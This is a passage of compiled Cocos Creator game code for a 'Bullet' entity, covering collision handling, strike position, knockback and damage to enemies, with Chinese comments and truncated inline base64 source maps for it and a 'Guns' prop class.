BQUEsaUJBWUM7UUFYRyxJQUFJLENBQUMsT0FBTyxHQUFHLEtBQUssQ0FBQztRQUNyQixJQUFJLENBQUMsSUFBSSxDQUFDLE1BQU0sR0FBRyxJQUFJLENBQUM7UUFDeEIsSUFBSSxDQUFDLEdBQUcsQ0FBQyxZQUFZLENBQUMsQ0FBQyxFQUFFLFNBQVMsRUFBRSxJQUFJLENBQUMsQ0FBQztRQUMxQyxLQUFLO1FBQ0wsSUFBSSxJQUFJLENBQUMsRUFBRSxHQUFHLENBQUMsRUFBQztZQUNaLElBQUksQ0FBQyxJQUFJLENBQUMsU0FBUyxDQUFDLEVBQUUsQ0FBQyxRQUFRLENBQUMsRUFBRSxDQUFDLFNBQVMsQ0FBQyxJQUFJLENBQUMsRUFBRSxHQUFDLENBQUMsQ0FBQyxFQUFFLEVBQUUsQ0FBQyxRQUFRLENBQUM7Z0JBQ2pFLEtBQUksQ0FBQyxHQUFHLENBQUMsWUFBWSxDQUFDLENBQUMsRUFBRSxLQUFLLEVBQUUsSUFBSSxDQUFDLENBQUM7WUFDMUMsQ0FBQyxDQUFDLEVBQUUsRUFBRSxDQUFDLEtBQUssQ0FBQyxDQUFDLEVBQUUsRUFBRSxDQUFDLEVBQUUsRUFBRSxDQUFDLFFBQVEsQ0FBQztnQkFDN0IsS0FBSSxDQUFDLElBQUksQ0FBQyxNQUFNLEdBQUcsS0FBSyxDQUFDO1lBQzdCLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQztTQUNSO0lBQ0wsQ0FBQztJQTNCZ0IsSUFBSTtRQUR4QixPQUFPO09BQ2EsSUFBSSxDQTRCeEI7SUFBRCxXQUFDO0NBNUJELEFBNEJDLENBNUJpQyxrQkFBUSxHQTRCekM7a0JBNUJvQixJQUFJIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcbmltcG9ydCBQcm9wQmFzZSBmcm9tIFwiLi9Qcm9wQmFzZVwiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzc1xyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBHdW5zIGV4dGVuZHMgUHJvcEJhc2Uge1xyXG5cclxuICAgIHNrZTpzcC5Ta2VsZXRvbiA9IG51bGw7XHJcblxyXG4gICAgb25Mb2FkKCl7XHJcbiAgICAgICAgc3VwZXIub25Mb2FkKCk7XHJcbiAgICAgICAgdGhpcy5za2UgPSB0aGlzLmdldENvbXBvbmVudChzcC5Ta2VsZXRvbik7XHJcbiAgICB9XHJcblxyXG5cclxuICAgIGluaXQoaWQ6IG51bWJlcik6IHZvaWQge1xyXG4gICAgICAgIHN1cGVyLmluaXQoaWQpO1xyXG4gICAgICAgIHRoaXMuc2tlLnNldFNraW4oKFwiMDAwXCIrKGlkLTEwMCkpLnN1YnN0cigtMykpO1xyXG4gICAgfVxyXG5cclxuICAgIGRpc3BsYXkoKXtcclxuICAgICAgICB0aGlzLl9vbl9vZmYgPSBmYWxzZTtcclxuICAgICAgICB0aGlzLm5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICB0aGlzLnNrZS5zZXRBbmltYXRpb24oMCwgXCJndW5fMDAyXCIsIHRydWUpO1xyXG4gICAgICAgIC8v5YCS6K6h5pe2XHJcbiAgICAgICAgaWYgKHRoaXMuY2QgPiAwKXtcclxuICAgICAgICAgICAgdGhpcy5ub2RlLnJ1bkFjdGlvbihjYy5zZXF1ZW5jZShjYy5kZWxheVRpbWUodGhpcy5jZC01KSwgY2MuY2FsbEZ1bmMoKCk9PntcclxuICAgICAgICAgICAgICAgIHRoaXMuc2tlLnNldEFuaW1hdGlvbigwLCBcImd1blwiLCB0cnVlKTtcclxuICAgICAgICAgICAgfSksIGNjLmJsaW5rKDUsIDI1KSwgY2MuY2FsbEZ1bmMoKCk9PntcclxuICAgICAgICAgICAgICAgIHRoaXMubm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICAgICAgfSkpKTtcclxuICAgICAgICB9XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/bullet/Bullet.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'be6a0BnFzlAN4b+ds0fdb/L', 'Bullet');
// script/app/entities/bullet/Bullet.ts

Object.defineProperty(exports, "__esModule", { value: true });
var ExcelConfig_1 = require("../../../../framework/config/ExcelConfig");
var ExcelTableNames_1 = require("../../config/ExcelTableNames");
var World_1 = require("../../info/World");
var ccclass = cc._decorator.ccclass;
/**
 * 普通子弹，单纯的一个碰撞体，移动一段距离后消失
 */
var Bullet = /** @class */ (function (_super) {
    __extends(Bullet, _super);
    function Bullet() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.bulletId = 0;
        _this.bThrought = false;
        _this.hurt = 0;
        _this.repel = 0;
        _this.stiff = 0;
        _this.moveDir = cc.v2();
        _this._collider = null;
        _this._contacts = [];
        return _this;
    }
    Object.defineProperty(Bullet.prototype, "contacts", {
        get: function () {
            return this._contacts;
        },
        enumerable: false,
        configurable: true
    });
    Object.defineProperty(Bullet.prototype, "collider", {
        get: function () {
            return this._collider;
        },
        enumerable: false,
        configurable: true
    });
    Bullet.prototype.onLoad = function () {
        var _this = this;
        this._collider = this.getComponent(cc.Collider);
        this.node.on(cc.Node.EventType.ROTATION_CHANGED, function () {
            var dir = cc.v2(0, 1).rotate(cc.misc.degreesToRadians(-_this.node.rotation));
            _this.moveDir.x = dir.x;
            _this.moveDir.y = dir.y;
        });
    };
    Bullet.prototype.init = function (id) {
        this.bulletId = id;
        var config = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Weapon)[this.bulletId % 100 - 1];
        this.bThrought = config['pierce'] === 1;
        this.hurt = Math.floor(config['hurt'] * World_1.World.My.armory.hurtMulOf(this.bulletId % 100));
        this.repel = config['repel'];
        this.stiff = config['stiff'];
    };
    /** 让子弹飞 */
    Bullet.prototype.fly = function (dir, distance, speed) {
        var _this = this;
        this.node.rotation = 90 - cc.misc.radiansToDegrees(Math.atan2(dir.y, dir.x));
        this.node.runAction(cc.sequence(cc.moveBy(distance / speed, dir.mul(distance)), cc.callFunc(function () {
            _this.node.active = false;
        })));
    };
    Bullet.prototype.onEnable = function () {
        window['GameBulletsController'].roleBullets.push(this);
    };
    Bullet.prototype.onDisable = function () {
        this.node.stopAllActions();
        this._contacts.length = 0;
        var gameBulletsController = window['GameBulletsController'];
        gameBulletsController.roleBullets.splice(gameBulletsController.roleBullets.indexOf(this), 1);
    };
    Bullet.prototype.getStrikePos = function (other, self) {
        var otherAABB = other.world.aabb;
        var selfAABB = self.world.aabb;
        // console.log("otherAABB==>", otherAABB);
        // console.log("selfAABB==>", selfAABB);
        // console.log("===================");
        /** 方法一 */
        /** 取包围盒的面积做比较，决策碰撞点，播放碰撞动画
         * 1.怪物比子弹大很多时就在子弹的位置播放
         * 2.子弹比怪物大很多时在怪物的位置播放
         * 3.大小差不多时取中点(小于0.5倍则取中点)
         * */
        // let rate = 1.5;
        // let selfArea = self.world.aabb.width * self.world.aabb.height;
        // let otherArea = other.world.aabb.width * other.world.aabb.height;
        // let strikePos = cc.v2();
        // if (selfArea > otherArea){
        //     if (selfArea/otherArea > rate){
        //         /** 取other节点的位置 */
        //         strikePos = other.world.aabb.center;
        //     } else {
        //         /** 取中心点 */
        //     }
        // }else {
        //     if (otherArea/selfArea > rate){
        //         /** 取self节点的位置 */
        //     } else {
        //         /** 取中心点 */
        //     }
        // }
        /** 方法二 */
        /** 用aabb包围盒判断碰撞点 */
        // let selfDir = selfAABB.center.sub(self.world.preAabb.center).normalize();
        //虽然可以用子弹的移动方向与物体的点集做运算，计算出边界碰撞位置，但是子弹已经飞过了这个位置，再在其他位置播放击中效果更突兀.
        /** 水平方向 */
        var strikePos = cc.v2();
        if (selfAABB.xMin >= otherAABB.xMin && selfAABB.xMax <= otherAABB.xMax) {
            strikePos.x = selfAABB.center.x;
        }
        else if (selfAABB.xMax <= otherAABB.center.x && selfAABB.xMin < otherAABB.xMin) {
            strikePos.x = selfAABB.xMax;
        }
        else if (selfAABB.xMin >= otherAABB.center.x && selfAABB.xMax > otherAABB.xMax) {
            strikePos.x = selfAABB.xMin;
        }
        else {
            strikePos.x = otherAABB.center.x;
        }
        /** 垂直方向 */
        if (selfAABB.yMin >= otherAABB.yMin && selfAABB.yMax <= otherAABB.yMax) {
            strikePos.y = selfAABB.center.y;
        }
        else if (selfAABB.yMax <= otherAABB.center.y && selfAABB.yMin < otherAABB.yMin) {
            strikePos.y = selfAABB.yMax;
        }
        else if (selfAABB.yMin >= otherAABB.center.y && selfAABB.yMax > otherAABB.yMax) {
            strikePos.y = selfAABB.yMin;
        }
        else {
            strikePos.y = otherAABB.center.y;
        }
        return strikePos;
    };
    /** 创建strike */
    Bullet.prototype.strike = function (other, self) {
        var bulletStrike = window['GameBulletsController'].getInactiveBulletStrike(this.bulletId);
        bulletStrike.node.active = true;
        bulletStrike.node.position = this.getStrikePos(other, self);
        bulletStrike.node.rotation = this.node.rotation;
        bulletStrike.strike();
    };
    Bullet.prototype.doRepeal = function (enemy, repel) {
        enemy.doRepel(this.moveDir, repel);
    };
    /**
     * 当碰撞产生的时候调用
     *  */
    Bullet.prototype.collisionEnemy = function (other, self) {
        this.strike(other, self);
        var enemy = other.getComponent('Enemy');
        /** 僵硬 */
        if (this.stiff > 0) {
            enemy.doStiff(this.stiff);
        }
        /** 减速 */
        enemy.doSpeedcut();
        /** 击退效果 */
        var subRepel = this.repel - enemy.unrepel;
        // let subRepel = 10;
        if (subRepel > 0) {
            // console.log("击退效果……。");
            this.doRepeal(enemy, subRepel);
        }
        else if (enemy.enemyID < 7) {
            enemy.playBeatenBack();
        }
        /** 飘血效果 */
        var damage = this.hurt;
        if (damage > 0) {
            enemy.hp -= damage;
        }
    };
    /**
     * 碰撞处理
     * */
    Bullet.prototype.onCollisionEnter = function (other, self) {
        this.collisionEnemy(other, self);
        if (!this.bThrought) {
            this.node.active = false;
        }
        // console.log('子弹碰撞');
    };
    /**
     * 当碰撞产生后，碰撞结束前的情况下，每次计算碰撞结果后调用
     * */
    Bullet.prototype.onCollisionStay = function (other, self) {
    };
    /** 当碰撞结束后调用 */
    Bullet.prototype.onCollisionExit = function (other, self) {
    };
    Bullet = __decorate([
        ccclass
    ], Bullet);
    return Bullet;
}(cc.Component));
exports.default = Bullet;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2J1bGxldC9CdWxsZXQudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7OztBQUVBLHdFQUFxRTtBQUNyRSxnRUFBNkQ7QUFDN0QsMENBQXVDO0FBRWhDLElBQUEsT0FBTyxHQUFJLEVBQUUsQ0FBQyxVQUFVLFFBQWpCLENBQWtCO0FBR2hDOztHQUVHO0FBRUg7SUFBb0MsMEJBQVk7SUFBaEQ7UUFBQSxxRUFrTUM7UUFqTUcsY0FBUSxHQUFHLENBQUMsQ0FBQztRQUViLGVBQVMsR0FBRyxLQUFLLENBQUM7UUFFbEIsVUFBSSxHQUFHLENBQUMsQ0FBQztRQUVULFdBQUssR0FBRyxDQUFDLENBQUM7UUFFVixXQUFLLEdBQUcsQ0FBQyxDQUFDO1FBRVYsYUFBTyxHQUFHLEVBQUUsQ0FBQyxFQUFFLEVBQUUsQ0FBQztRQUVWLGVBQVMsR0FBZSxJQUFJLENBQUM7UUFFM0IsZUFBUyxHQUFHLEVBQUUsQ0FBQzs7SUFtTDdCLENBQUM7SUFoTEcsc0JBQUksNEJBQVE7YUFBWjtZQUNJLE9BQU8sSUFBSSxDQUFDLFNBQVMsQ0FBQztRQUMxQixDQUFDOzs7T0FBQTtJQUVELHNCQUFJLDRCQUFRO2FBQVo7WUFDSSxPQUFPLElBQUksQ0FBQyxTQUFTLENBQUM7UUFDMUIsQ0FBQzs7O09BQUE7SUFHRCx1QkFBTSxHQUFOO1FBQUEsaUJBT0M7UUFORyxJQUFJLENBQUMsU0FBUyxHQUFHLElBQUksQ0FBQyxZQUFZLENBQUMsRUFBRSxDQUFDLFFBQVEsQ0FBQyxDQUFDO1FBQ2hELElBQUksQ0FBQyxJQUFJLENBQUMsRUFBRSxDQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUMsU0FBUyxDQUFDLGdCQUFnQixFQUFFO1lBQzdDLElBQUksR0FBRyxHQUFHLEVBQUUsQ0FBQyxFQUFFLENBQUMsQ0FBQyxFQUFFLENBQUMsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDLGdCQUFnQixDQUFDLENB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O0lBQ0wsZ0NBQWUsR0FBZixVQUFnQixLQUFLLEVBQUUsSUFBSTtJQUUzQixDQUFDO0lBRUQsZUFBZTtJQUNmLGdDQUFlLEdBQWYsVUFBZ0IsS0FBSyxFQUFFLElBQUk7SUFFM0IsQ0FBQztJQWhNZ0IsTUFBTTtRQUQxQixPQUFPO09BQ2EsTUFBTSxDQWtNMUI7SUFBRCxhQUFDO0NBbE1ELEFBa01DLENBbE1tQyxFQUFFLENBQUMsU0FBUyxHQWtNL0M7a0JBbE1vQixNQUFNIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcblxyXG5pbXBvcnQge0V4Y2VsQ29uZmlnfSBmcm9tIFwiLi4vLi4vLi4vLi4vZnJhbWV3b3JrL2NvbmZpZy9FeGNlbENvbmZpZ1wiO1xyXG5pbXBvcnQge0V4Y2VsVGFibGVOYW1lc30gZnJvbSBcIi4uLy4uL2NvbmZpZy9FeGNlbFRhYmxlTmFtZXNcIjtcclxuaW1wb3J0IHtXb3JsZH0gZnJvbSBcIi4uLy4uL2luZm8vV29ybGRcIjtcclxuXHJcbmNvbnN0IHtjY2NsYXNzfSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5cclxuLyoqXHJcbiAqIOaZrumAmuWtkOW8ue+8jOWNlee6r+eahOS4gOS4queisOaSnuS9k++8jOenu+WKqOS4gOautei3neemu+WQjua2iOWksVxyXG4gKi9cclxuQGNjY2xhc3NcclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgQnVsbGV0IGV4dGVuZHMgY2MuQ29tcG9uZW50IHtcclxuICAgIGJ1bGxldElkID0gMDtcclxuXHJcbiAgICBiVGhyb3VnaHQgPSBmYWxzZTtcclxuXHJcbiAgICBodXJ0ID0gMDtcclxuXHJcbiAgICByZXBlbCA9IDA7XHJcblxyXG4gICAgc3RpZmYgPSAwO1xyXG5cclxuICAgIG1vdmVEaXIgPSBjYy52MigpO1xyXG5cclxuICAgIHByaXZhdGUgX2NvbGxpZGVyOmNjLkNvbGxpZGVyID0gbnVsbDtcclxuXHJcbiAgICBwcm90ZWN0ZWQgX2NvbnRhY3RzID0gW107XHJcblxyXG5cclxuICAgIGdldCBjb250YWN0cygpOiBhbnlbXSB7XHJcbiAgICAgICAgcmV0dXJuIHRoaXMuX2NvbnRhY3RzO1xyXG4gICAgfVxyXG5cclxuICAgIGdldCBjb2xsaWRlcigpOiBjYy5Db2xsaWRlciB7XHJcbiAgICAgICAgcmV0dXJuIHRoaXMuX2NvbGxpZGVyO1xyXG4gICAgfVxyXG5cclxuXHJcbiAgICBvbkxvYWQoKXtcclxuICAgICAgICB0aGlzLl9jb2xsaWRlciA9IHRoaXMuZ2V0Q29tcG9uZW50KGNjLkNvbGxpZGVyKTtcclxuICAgICAgICB0aGlzLm5vZGUub24oY2MuTm9kZS5FdmVudFR5cGUuUk9UQVRJT05fQ0hBTkdFRCwgKCk9PntcclxuICAgICAgICAgICAgbGV0IGRpciA9IGNjLnYyKDAsIDEpLnJvdGF0ZShjYy5taXNjLmRlZ3JlZXNUb1JhZGlhbnMoLXRoaXMubm9kZS5yb3RhdGlvbikpO1xyXG4gICAgICAgICAgICB0aGlzLm1vdmVEaXIueCA9IGRpci54O1xyXG4gICAgICAgICAgICB0aGlzLm1vdmVEaXIueSA9IGRpci55O1xyXG4gICAgICAgIH0pO1xyXG4gICAgfVxyXG5cclxuXHJcbiAgICBpbml0KGlkOm51bWJlcil7XHJcbiAgICAgICAgdGhpcy5idWxsZXRJZCA9IGlkO1xyXG4gICAgICAgIGxldCBjb25maWcgPSBFeGNlbENvbmZpZy5nZXRFeGNlbFRhYmxlKEV4Y2VsVGFibGVOYW1lcy5XZWFwb24pW3RoaXMuYnVsbGV0SWQlMTAwLTFdO1xyXG4gICAgICAgIHRoaXMuYlRocm91Z2h0ID0gY29uZmlnWydwaWVyY2UnXSA9PT0gMTtcclxuICAgICAgICB0aGlzLmh1cnQgPSBNYXRoLmZsb29yKGNvbmZpZ1snaHVydCddKldvcmxkLk15LmFybW9yeS5odXJ0TXVsT2YodGhpcy5idWxsZXRJZCUxMDApKTtcclxuICAgICAgICB0aGlzLnJlcGVsID0gY29uZmlnWydyZXBlbCddO1xyXG4gICAgICAgIHRoaXMuc3RpZmYgPSBjb25maWdbJ3N0aWZmJ107XHJcbiAgICB9XHJcblxyXG4gICAgLyoqIOiuqeWtkOW8uemjniAqL1xyXG4gICAgZmx5KGRpcjpjYy5WZWMyLC